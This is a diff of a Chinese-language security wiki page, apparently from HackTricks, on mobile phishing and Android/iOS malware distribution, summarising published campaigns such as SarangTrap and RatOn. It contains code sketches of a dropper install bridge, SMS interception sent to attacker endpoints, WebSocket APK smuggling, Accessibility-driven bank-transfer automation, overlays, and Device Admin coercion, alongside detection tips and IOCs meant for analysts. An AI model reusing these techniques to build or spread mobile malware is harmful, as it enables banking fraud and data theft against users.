@@ -1,63 +1,73 @@
-# 移动网络钓鱼与恶意应用分发 (Android & iOS)
+# 移动钓鱼与恶意应用分发（Android 与 iOS）
 
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!INFO]
-> 本页介绍威胁行为者通过钓鱼（SEO、社会工程、假冒商店、约会应用等）分发 **恶意 Android APKs** 和 **iOS 移动配置文件** 的技术。
-> 材料改编自 Zimperium zLabs（2025）披露的 SarangTrap 活动及其他公开研究。
+> 本页涵盖威胁行为者通过钓鱼（SEO、social engineering、假商店、约会应用等）分发**malicious Android APKs**和**iOS mobile-configuration profiles**的技术。
+> 材料改编自 Zimperium zLabs（2025）曝光的 SarangTrap 活动及其他公开研究。
 
 ## 攻击流程
 
-1. **SEO/Phishing 基础设施**
-* 注册数十个相似域名（约会、云分享、汽车服务等）。
-– 使用本地语言关键词并在 `<title>` 元素中加入表情符号以提高 Google 排名。
-– 在同一落地页上同时托管 Android (`.apk`) 和 iOS 安装说明。
-2. **第一阶段下载**
-* Android：直接链接到 *未签名* 或“第三方商店”APK。
+1. **SEO/Phishing Infrastructure**
+* 注册大量相似域名（约会、云分享、汽车服务……）。
+– 在 `<title>` 元素中使用本地语言关键词和表情符号以提高 Google 排名。
+– 在同一着陆页上同时托管 Android（`.apk`）和 iOS 安装说明。
+2. **First Stage Download**
+* Android：指向未签名或“third-party store” APK 的直接链接。
 * iOS：`itms-services://` 或普通 HTTPS 链接到恶意 **mobileconfig** 配置文件（见下文）。
-3. **安装后社会工程**
-* 首次运行时，应用会要求提供 **邀请/验证码**（制造独占访问的假象）。
-* 该代码通过 **HTTP POST** 发送到 Command-and-Control (C2)。
+3. **Post-install Social Engineering**
+* 首次运行时，应用要求输入 **invitation / verification code**（营造专属访问的假象）。
+* 该代码通过 HTTP POST 发送到 Command-and-Control (C2)。
 * C2 回复 `{"success":true}` ➜ 恶意程序继续执行。
-* 从不提交有效代码的沙箱/AV 动态分析将看不到 **恶意行为**（规避检测）。
-4. **运行时权限滥用 (Android)**
-* 危险权限仅在收到 C2 的正面响应后才请求：
+* 从未提交有效代码的沙箱/AV 动态分析不会看到恶意行为（规避）。
+4. **Runtime Permission Abuse** (Android)
+* 危险权限仅在收到 C2 的正面响应后请求：
 ```xml
 <uses-permission android:name="android.permission.READ_CONTACTS"/>
 <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
 <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 <!-- Older builds also asked for SMS permissions -->
 ```
-* 新的变种会**从 `AndroidManifest.xml` 中移除 SMS 的 `<uses-permission>`**，但保留通过反射读取 SMS 的 Java/Kotlin 代码路径 ⇒ 降低静态检测得分，同时在通过 `AppOps` 滥用或老旧目标设备上仍能工作。
-5. **伪装 UI 与后台采集**
-* 应用显示本地实现的无害界面（短信查看器、图库选择器）。
-* 同时它会外传：
-- IMEI / IMSI、手机号
+* 近期变体**从 `AndroidManifest.xml` 中移除 SMS 的 `<uses-permission>`**，但保留通过反射读取 SMS 的 Java/Kotlin 代码路径 ⇒ 降低静态评分，同时在通过 `AppOps` 滥用或旧目标授予权限的设备上仍可工作。
+
+5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
+* Android 13 为 sideloaded apps 引入了 **Restricted settings**：Accessibility 和 Notification Listener 切换在用户未在 **App info** 明确允许 restricted settings 前会被置灰。
+* 钓鱼页面和 droppers 现在提供逐步 UI 指令，指导用户为 sideloaded app **允许 restricted settings**，然后启用 Accessibility/Notification 访问。
+* 更新的绕过方法是通过 **session‑based PackageInstaller flow**（与应用商店相同的方法）安装负载。Android 会将应用视为 store‑installed，因此 Restricted settings 不再阻止 Accessibility。
+* 筛查提示：在 dropper 中，grep `PackageInstaller.createSession/openSession` 以及立即导航受害者到 `ACTION_ACCESSIBILITY_SETTINGS` 或 `ACTION_NOTIFICATION_LISTENER_SETTINGS` 的代码。
+
+6. **Facade UI & Background Collection**
+* 应用显示无害界面（SMS 查看器、图库选择器），这些界面在本地实现。
+* 同时它会外泄：
+- IMEI / IMSI, 手机号码
 - 完整的 `ContactsContract` 导出（JSON 数组）
-- 从 `/sdcard/DCIM` 提取的 JPEG/PNG，使用 [Luban](https://github.com/Curzibn/Luban) 压缩以减小体积
+- 来自 `/sdcard/DCIM` 的 JPEG/PNG，使用 [Luban](https://github.com/Curzibn/Luban) 压缩以减小体积
 - 可选的 SMS 内容（`content://sms`）
-Payloads are **batch-zipped** and sent via `HTTP POST /upload.php`.
-6. **iOS 交付技术**
-* 单个 **移动配置文件** 可以请求 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 等，以将设备注册到类似 “MDM” 的监管中。
-* 社会工程安装指引：
+负载被**批量压缩为 zip**并通过 `HTTP POST /upload.php` 发送。
+7. **iOS Delivery Technique**
+* 单个 **mobile-configuration profile** 可以请求 `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` 等，将设备注册为类似 “MDM” 的管理状态。
+* 社会工程指令：
 1. 打开 Settings ➜ *Profile downloaded*。
-2. 点击 *Install* 三次（钓鱼页面上有截图）。
-3. 信任未签名的配置文件 ➜ 攻击者在无需 App Store 审核的情况下获得 *Contacts* 与 *Photo* 授权。
-7. **网络层**
-* 明文 HTTP，常在 80 端口，HOST 头类似 `api.<phishingdomain>.com`。
+2. 点击 *Install* 三次（钓鱼页上有截图）。
+3. 信任未签名的配置文件 ➜ 攻击者在无需 App Store 审核的情况下获得 *Contacts* 与 *Photo* 权限。
+8. **iOS Web Clip Payload (phishing app icon)**
+* `com.apple.webClip.managed` payloads 可以**将钓鱼 URL 固定到主屏幕**，带有品牌图标/标签。
+* Web Clips 可运行**全屏**（隐藏浏览器 UI），并可被标记为**不可移除**，受害者必须删除配置文件才能移除图标。
+9. **Network Layer**
+* 明文 HTTP，通常在端口 80，HOST 头类似 `api.<phishingdomain>.com`。
 * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（无 TLS → 易被发现）。
 
-## 红队提示
+## Red-Team Tips
 
-* **动态分析绕过** – 在恶意软件评估期间，使用 Frida/Objection 自动化邀请代码阶段以触发恶意分支。
-* **Manifest 与运行时差异** – 比较 `aapt dump permissions` 与运行时的 `PackageManager#getRequestedPermissions()`；缺失的危险权限是一个风险信号。
-* **网络金丝雀** – 配置 `iptables -p tcp --dport 80 -j NFQUEUE` 以检测代码输入后不正常的 POST 高峰。
-* **mobileconfig 检查** – 在 macOS 上使用 `security cms -D -i profile.mobileconfig` 列出 `PayloadContent` 并发现过多的权限。
+* **Dynamic Analysis Bypass** – 在恶意软件评估时，使用 Frida/Objection 自动化 invitation code 阶段以进入恶意分支。
+* **Manifest vs. Runtime Diff** – 比较 `aapt dump permissions` 与运行时的 `PackageManager#getRequestedPermissions()`；危险权限缺失是一个红旗。
+* **Network Canary** – 配置 `iptables -p tcp --dport 80 -j NFQUEUE` 以检测代码输入后异常的 POST 爆发。
+* **mobileconfig Inspection** – 在 macOS 上使用 `security cms -D -i profile.mobileconfig` 列出 `PayloadContent` 并发现过度的权限。
 
-## 有用的 Frida 片段：自动绕过邀请代码
+## Useful Frida Snippet: Auto-Bypass Invitation Code
 
 <details>
-<summary>Frida：自动绕过邀请代码</summary>
+<summary>Frida: auto-bypass invitation code</summary>
 ```javascript
 // frida -U -f com.badapp.android -l bypass.js --no-pause
 // Hook HttpURLConnection write to always return success
@@ -78,7 +88,7 @@ return conn;
 ```
 </details>
 
-## 通用指标
+## 指标（通用）
 ```
 /req/checkCode.php        # invite code validation
 /upload.php               # batched ZIP exfiltration
@@ -86,28 +96,28 @@ LubanCompress 1.1.8       # "Luban" string inside classes.dex
 ```
 ---
 
-## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 模式
+## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern
 
-此模式已在滥用政府福利主题的活动中被观测到，用于窃取印度 UPI 凭证和 OTP。运营者串联信誉良好的平台来投放并提高抗打击能力。
+这种模式在滥用政府补贴主题的活动中被观察到，用于窃取印度 UPI 凭证和 OTPs。运营者将信誉良好的平台串联起来以实现投放和提高抗打击能力。
 
-### 跨可信平台的投放链
-- YouTube 视频诱饵 → 描述中包含短链
-- 短链 → GitHub Pages phishing site，模仿合法门户
-- 同一 GitHub 仓库托管一个 APK，带有假 “Google Play” 徽章并直接链接到文件
-- 动态 phishing 页面托管在 Replit；远程命令通道使用 Firebase Cloud Messaging (FCM)
+### Delivery chain across trusted platforms
+- YouTube 视频诱饵 → 描述包含短链接
+- 短链接 → GitHub Pages 钓鱼站，模仿合法门户
+- 同一 GitHub 仓库托管了一个 APK，并用假的 “Google Play” 徽章直接链接到该文件
+- 动态钓鱼页面托管在 Replit；远程命令通道使用 Firebase Cloud Messaging (FCM)
 
-### Dropper：嵌入式 payload 与离线安装
-- 第一个 APK 是一个 installer（dropper），在 `assets/app.apk` 中携带真实 malware，并提示用户禁用 Wi‑Fi/mobile data 以削弱云检测。
-- 嵌入式 payload 以无害标签安装（例如 “Secure Update”）。安装后，installer 与 payload 将作为独立应用同时存在。
+### Dropper 带嵌入载荷和离线安装
+- 第一个 APK 是一个安装器 (dropper)，它在 `assets/app.apk` 中携带真实的恶意软件，并提示用户关闭 Wi‑Fi/移动数据以削弱云端检测。
+- 嵌入的载荷以无害的标签安装（例如，“Secure Update”）。安装后，安装器和载荷作为两个独立的应用存在。
 
-静态排查提示（grep 搜索嵌入的 payloads）：
+静态排查提示（使用 grep 查找嵌入的载荷）：
 ```bash
 unzip -l sample.apk | grep -i "assets/app.apk"
 # Or:
 zipgrep -i "classes|.apk" sample.apk | head
 ```
-### 通过 shortlink 动态发现 endpoint
-- Malware 从 shortlink 获取一份纯文本、用逗号分隔的活动 endpoint 列表；简单的字符串转换生成最终的 phishing 页面路径。
+### 通过短链接进行动态端点发现
+- Malware 从短链接获取一个纯文本、以逗号分隔的活动端点列表；简单的字符串变换生成最终的 phishing 页面路径。
 
 示例（已脱敏）：
 ```
@@ -126,7 +136,7 @@ String smsPost = parts[1];
 String credsPost = upiPage.replace("gate.htm", "addup.php");
 ```
 ### WebView-based UPI credential harvesting
-- “Make payment of ₹1 / UPI‑Lite” 步骤在 WebView 内从动态端点加载攻击者 HTML 表单并捕获敏感字段（手机、银行、UPI PIN），这些字段通过 `POST` 提交到 `addup.php`。
+- “Make payment of ₹1 / UPI‑Lite” 步骤在 WebView 内从动态端点加载攻击者 HTML 表单并捕获敏感字段（手机号、银行、UPI PIN），这些字段通过 `POST` 发送到 `addup.php`。
 
 最小加载器：
 ```java
@@ -134,18 +144,18 @@ WebView wv = findViewById(R.id.web);
 wv.getSettings().setJavaScriptEnabled(true);
 wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
 ```
-### 自我传播与 SMS/OTP 拦截
-- 在首次运行时会请求激进的权限：
+### Self-propagation and SMS/OTP interception
+- 在首次运行时会请求过多权限：
 ```xml
 <uses-permission android:name="android.permission.READ_CONTACTS"/>
 <uses-permission android:name="android.permission.SEND_SMS"/>
 <uses-permission android:name="android.permission.READ_SMS"/>
 <uses-permission android:name="android.permission.CALL_PHONE"/>
 ```
-- 联系人被循环用于从受害者的设备群发 smishing SMS。
-- 收到的 SMS 会被 broadcast receiver 截获，并连同元数据（发送者, 消息正文, SIM slot, 每设备随机 ID）上传到 `/addsm.php`。
+- 联系人被循环以从受害者设备群发 smishing SMS。
+- 收到的 SMS 会被 broadcast receiver 截获，并连同元数据（sender、body、SIM slot、per-device random ID）上传到 `/addsm.php`。
 
-接收器示意：
+接收器草图：
 ```java
 public void onReceive(Context c, Intent i){
 SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
@@ -159,10 +169,10 @@ postForm(urlAddSms, new FormBody.Builder()
 }
 }
 ```
-### Firebase Cloud Messaging (FCM) 作为弹性 C2
-- payload 向 FCM 注册；推送消息携带一个 `_type` 字段，用作触发动作的开关（例如，更新钓鱼文本模板、切换行为）。
+### Firebase Cloud Messaging (FCM) 作为弹性的 C2
+- payload 向 FCM 注册；推送消息携带一个 `_type` 字段，用作触发操作的开关（例如：更新 phishing 文本模板、切换行为）。
 
-Example FCM payload:
+示例 FCM payload:
 ```json
 {
 "to": "<device_fcm_token>",
@@ -184,24 +194,24 @@ case "smish": sendSmishToContacts(); break;
 }
 }
 ```
-### Indicators/IOCs
-- APK 包含次级 payload，位于 `assets/app.apk`
-- WebView 从 `gate.htm` 加载 payment 并外发到 `/addup.php`
-- 通过 SMS 外发到 `/addsm.php`
-- 通过 Shortlink 获取配置（例如 `rebrand.ly/*`），响应为 CSV 格式的端点
-- 应用被标记为通用 “Update/Secure Update”
-- 在不受信任的应用中，FCM `data` 消息带有 `_type` 判别字段
+### 指标/IOCs
+- APK 在 `assets/app.apk` 包含次级 payload
+- WebView 从 `gate.htm` 加载 payment 并 exfiltrates 到 `/addup.php`
+- SMS exfiltration 到 `/addsm.php`
+- 通过短链接驱动的配置抓取（例如 `rebrand.ly/*`），返回 CSV 端点
+- 应用标记为通用 “Update/Secure Update”
+- 在不受信任的应用中，FCM `data` 消息带有 `_type` 判别器
 
 ---
 
-## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
+## 基于 Socket.IO/WebSocket 的 APK 走私 + 假冒 Google Play 页面
 
-Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.
+攻击者越来越多地用嵌入在类 Google Play 诱饵中的 Socket.IO/WebSocket 通道替换静态 APK 链接。这可以隐藏 payload URL、绕过 URL/扩展名 过滤器，并保留真实的安装 UX。
 
-在真实环境中观察到的典型客户端流程：
+实战中观察到的典型客户端流程：
 
 <details>
-<summary>Socket.IO fake Play downloader (JavaScript)</summary>
+<summary>Socket.IO 假冒 Play 下载器 (JavaScript)</summary>
 ```javascript
 // Open Socket.IO channel and request payload
 const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
@@ -223,24 +233,24 @@ document.body.appendChild(a); a.click();
 ```
 </details>
 
-为什么它能够规避简单的防护：
-- 未暴露静态 APK URL；有效载荷从 WebSocket 帧在内存中重构。
-- 阻止直接 .apk 响应的 URL/MIME/扩展名过滤器可能会漏掉通过 WebSockets/Socket.IO 隧道传输的二进制数据。
-- 不执行 WebSockets 的爬虫和 URL 沙箱将无法获取有效载荷。
+为何能规避简单防护：
+- 未暴露静态 APK URL；payload 从 WebSocket frames 在内存中重建。
+- 阻止直接 .apk 响应的 URL/MIME/extension filters 可能会漏掉通过 WebSockets/Socket.IO 隧道传输的 binary data。
+- 不执行 WebSockets 的 crawlers 和 URL sandboxes 无法检索到 payload。
 
-另请参见 WebSocket 的实战技巧与工具：
+另见 WebSocket 相关战术与工具：
 
 {{#ref}}
 ../../pentesting-web/websocket-attacks.md
 {{#endref}}
 
 
-## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn 案例研究
+## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study
 
-RatOn banker/RAT 活动（ThreatFabric）是一个具体示例，说明现代 mobile phishing 行动如何将 WebView droppers、基于 Accessibility 的 UI 自动化、overlays/赎金界面、Device Admin 强制手段、Automated Transfer System (ATS)、crypto wallet takeover，甚至 NFC-relay 编排结合起来。本节对这些可复用技术进行抽象。
+RatOn banker/RAT campaign (ThreatFabric) 是一个具体示例，说明现代 mobile phishing operations 如何融合 WebView droppers、Accessibility-driven UI automation、overlays/ransom、Device Admin coercion、Automated Transfer System (ATS)、crypto wallet takeover，甚至 NFC-relay orchestration。本节抽象出可复用的技术。
 
-### Stage-1：WebView → 本地安装桥（dropper）
-攻击者展示一个指向攻击者页面的 WebView，并注入一个暴露本地安装器的 JavaScript 接口。点击 HTML 按钮会调用本地代码，该代码安装捆绑在 dropper 资产中的二阶段 APK，然后直接启动它。
+### Stage-1: WebView → native install bridge (dropper)
+攻击者展示一个指向攻击者页面的 WebView，并注入一个暴露 native installer 的 JavaScript 接口。点击 HTML 按钮会调用 native 代码，安装捆绑在 dropper 的 assets 中的 second-stage APK，然后直接启动它。
 
 最小模式：
 
@@ -280,19 +290,19 @@ wv.loadUrl("https://attacker.site/install.html");
 ```html
 <button onclick="bridge.installApk()">Install</button>
 ```
-安装后，dropper 通过 explicit package/activity 启动 payload:
+安装后，dropper 通过显式的 package/activity 启动 payload：
 ```java
 Intent i = new Intent();
 i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
 startActivity(i);
 ```
-Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.
+狩猎思路：不受信任的应用调用 `addJavascriptInterface()` 并向 WebView 暴露类似安装器的方法；APK 在 `assets/` 下携带嵌入的二次有效载荷并调用 Package Installer Session API。
 
 ### 同意流程：Accessibility + Device Admin + 后续运行时提示
-Stage-2 打开一个托管 “Access” 页面 的 WebView。页面上的按钮调用一个 exported 方法，导航受害者到 Accessibility 设置并请求启用该恶意服务。一旦授予权限，malware 会利用 Accessibility 在后续运行时权限对话框（contacts、overlay、manage system settings 等）中自动点击通过，并请求 Device Admin。
+第2阶段会打开一个承载 “Access” 页面 的 WebView。该页面的按钮调用一个 exported method，将受害者导航到 Accessibility 设置并请求启用该恶意服务。一旦被授予，malware 会使用 Accessibility 在后续的运行时权限对话框（contacts、overlay、manage system settings 等）中自动点击，并请求 Device Admin。
 
-- Accessibility 通过在节点树中查找类似 “Allow”/“OK” 的按钮并派发点击事件，编程式地帮助接受后续提示。
-- Overlay 权限 检查/请求：
+- Accessibility 通过在节点树（node-tree）中查找类似 “Allow”/“OK” 的按钮并派发点击，从而以编程方式帮助接受后续提示。
+- Overlay 权限检查/请求：
 ```java
 if (!Settings.canDrawOverlays(ctx)) {
 Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -300,27 +310,27 @@ Uri.parse("package:" + ctx.getPackageName()));
 ctx.startActivity(i);
 }
 ```
-另见：
+See also:
 
 {{#ref}}
 ../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
 {{#endref}}
 
-### 通过 WebView 的覆盖式钓鱼/勒索
-操作者可以发送命令以：
-- 从 URL 渲染全屏覆盖，或
-- 传递内联 HTML，并将其加载到 WebView 覆盖中。
+### Overlay phishing/ransom via WebView
+操作者可以发出命令以：
+- 从 URL 渲染全屏 overlay，或
+- 传入内联 HTML 并将其加载到 WebView overlay 中。
 
-可能用途：胁迫（PIN 输入）、打开钱包以捕获 PIN、勒索消息。应保留一个命令以在缺少覆盖权限时确保授予该权限。
+可能用途：胁迫（输入 PIN）、打开钱包以捕获 PIN、勒索消息。保留一个命令以在缺少时确保 overlay 权限已被授予。
 
-### 远程控制模型 – 文本伪屏 + 屏幕投射
-- 低带宽：定期转储 Accessibility 节点树，序列化可见文本/角色/边界，并作为伪屏发送到 C2（命令例如 `txt_screen` 一次性，`screen_live` 持续）。
-- 高保真：请求 MediaProjection 并按需开始屏幕投射/录制（命令例如 `display` / `record`）。
+### Remote control model – text pseudo-screen + screen-cast
+- 低带宽：定期 dump Accessibility node tree，序列化可见文本/roles/边界并作为伪屏幕发送到 C2（如 `txt_screen` 一次性，`screen_live` 连续）。
+- 高保真：请求 MediaProjection 并按需开始屏幕投射/录制（如 `display` / `record` 命令）。
 
-### ATS 剧本（银行应用自动化）
-给定一个 JSON 任务，打开银行应用，通过 Accessibility 以文本查询和坐标点击相结合的方式驱动 UI，并在提示时输入受害者的支付 PIN。
+### ATS playbook (bank app automation)
+给定一个 JSON 任务，打开银行应用，通过 Accessibility 驱动 UI，混合使用文本查询和坐标点击，并在提示时输入受害者的支付 PIN。
 
-示例任务:
+Example task:
 ```json
 {
 "cmd": "transfer",
@@ -344,12 +354,12 @@ Example texts seen in one target flow (CZ → EN):
 Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.
 
 ### Crypto wallet seed extraction
-Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to 安全/恢复, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.
+Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.
 
 ### Device Admin coercion
 Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:
 
-- 立即锁定:
+- Immediate lock:
 ```java
 dpm.lockNow();
 ```
@@ -357,41 +367,41 @@ dpm.lockNow();
 ```java
 dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
 ```
-- 强制非生物识别解锁，通过禁用 keyguard 的生物识别功能：
+- 强制非生物识别解锁：通过禁用 keyguard 的生物识别功能：
 ```java
 dpm.setKeyguardDisabledFeatures(admin,
 DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
 DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
 ```
-注意：许多 DevicePolicyManager 控制在近期 Android 上需要 Device Owner/Profile Owner；某些 OEM 构建可能较为宽松。始终在目标 OS/OEM 上验证。
+注意：许多 DevicePolicyManager 控件在较新的 Android 上要求 Device Owner/Profile Owner；某些 OEM 构建可能宽松。始终在目标 OS/OEM 上验证。
 
-### NFC relay orchestration (NFSkate)
-Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.
+### NFC 中继编排 (NFSkate)
+Stage-3 可以安装并启动外部 NFC 中继模块（例如 NFSkate），甚至向其传递一个 HTML 模板以在中继过程中引导受害者。这使得无接触的现场刷卡现金套现与在线 ATS 并行成为可能。
 
-Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).
+背景: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).
 
-### Operator command set (sample)
-- UI/state: `txt_screen`, `screen_live`, `display`, `record`
-- Social: `send_push`, `Facebook`, `WhatsApp`
-- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
-- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
+### 操作员命令集（示例）
+- UI/状态: `txt_screen`, `screen_live`, `display`, `record`
+- 社交: `send_push`, `Facebook`, `WhatsApp`
+- 覆盖层: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
+- 钱包: `metamask`, `trust`, `blockchain`, `phantom`
 - ATS: `transfer`, `check_limit`, `limit`
-- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
-- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
+- 设备: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
+- 通信/侦察: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
 - NFC: `nfs`, `nfs_inject`
 
-### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)
+### Accessibility 驱动的 ATS 反检测：类人文本节奏与双重文本注入 (Herodotus)
 
-攻击者越来越多地将 Accessibility-driven 自动化与针对基本行为生物识别的反检测技术结合。最近一个 banker/RAT 展示了两种互补的文本传送模式以及一个操作员切换，用于模拟带随机节奏的人类输入。
+威胁行为者越来越多地将 Accessibility 驱动的自动化与针对基本行为生物特征的反检测技术相结合。最近的 banker/RAT 展示了两种互补的文本传递模式和一个操作员开关，用于通过随机节奏模拟人工打字。
 
-- Discovery mode: 枚举可见节点，使用选择器和 bounds 精确定位输入（ID、text、contentDescription、hint、bounds）后再操作。
-- Dual text injection:
-- Mode 1 – `ACTION_SET_TEXT` 直接作用于目标节点（稳定，无需键盘）；
-- Mode 2 – 先设置剪贴板并对聚焦节点执行 `ACTION_PASTE`（在 direct setText 被阻止时可用）。
-- Human-like cadence: 将操作员提供的字符串拆分，并以字符为单位发送，每次事件间随机延迟 300–3000 ms，以规避“机器速度打字”启发式检测。可通过逐步用 `ACTION_SET_TEXT` 增长值来实现，或逐字符粘贴实现。
+- 发现模式：在操作之前枚举可见节点并使用选择器和 bounds 精确定位输入（ID、text、contentDescription、hint、bounds）。
+- 双重文本注入：
+  - 模式 1 – `ACTION_SET_TEXT` 直接作用于目标节点（稳定，无键盘）；
+  - 模式 2 – 将内容放入剪贴板然后对聚焦节点执行 `ACTION_PASTE`（当直接 setText 被阻止时有效）。
+- 类人节奏：将操作员提供的字符串拆分并逐字符发送，在事件之间使用随机 300–3000 ms 延迟以规避“machine-speed typing” 启发式。可通过逐步增长值（使用 `ACTION_SET_TEXT`），或逐字符粘贴实现。
 
 <details>
-<summary>Java 草图：节点发现 + 通过 setText 或 clipboard+paste 逐字符延迟输入</summary>
+<summary>Java 草图：节点发现 + 通过 setText 或 clipboard+paste 的延迟逐字符输入</summary>
 ```java
 // Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
 void discover(AccessibilityNodeInfo r, List<String> out){
@@ -426,11 +436,11 @@ Thread.sleep(300 + new java.util.Random().nextInt(2701));
 ```
 </details>
 
-用于欺诈掩护的阻断覆盖层：
-- 渲染全屏 `TYPE_ACCESSIBILITY_OVERLAY`，由操作者控制不透明度；在远程自动化在下面运行时对受害者保持不透明。
-- 通常暴露的命令：`opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.
+用于欺诈掩护的屏蔽覆盖层：
+- 渲染一个全屏 `TYPE_ACCESSIBILITY_OVERLAY`，由操作者控制不透明度；对受害者保持不透明，同时远程自动化在其下方运行。
+- 通常暴露的命令： `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.
 
-可调 alpha 的最小覆盖层：
+可调透明度的最小覆盖层：
 ```java
 View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
 WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
@@ -456,5 +466,7 @@ wm.addView(v, lp);
 - [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 - [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
 - [Socket.IO](https://socket.io)
+- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
+- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
 
 {{#include ../../banners/hacktricks-training.md}}
